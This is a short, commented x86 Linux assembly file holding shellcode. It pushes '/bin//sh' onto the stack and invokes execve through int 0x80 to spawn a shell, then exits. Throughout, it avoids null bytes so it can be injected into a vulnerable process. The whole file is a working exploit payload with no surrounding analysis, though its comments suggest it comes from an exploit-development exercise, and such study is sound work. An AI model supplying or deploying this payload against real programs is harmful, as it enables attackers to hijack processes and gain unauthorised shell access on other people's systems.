global _start

section .text

_start:

zero:
    xor eax, eax 
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

shell:
    ; [ /bin//sh | 0x00000000 ]
    push eax        ; \x00
    push "//sh"     ; sh\x00
    push "/bin"     ; /bin//sh\x00
    mov ebx, esp    ; ebx = /bin//sh

    ; [ Address of /bin//sh | 0x00000000 | /bin//sh | 0x00000000 ]
    push eax        ; \x00
    push ebx        ; Address of /bin//sh
   
    ; execve("/bin//sh", [ "/bin//sh", NULL ], NULL) 
    mov ecx, esp    ; ecx = [ "/bin//sh", NULL ] 
    mov al, 0xB     ; Syscall # for execve() 
    int 0x80        ; Calls kernel

exit:
    xor eax, eax    
    inc eax         ; eax = 1 , Syscall # for exit()
    xor ebx, ebx
    int 0x80        ; Calls kernel
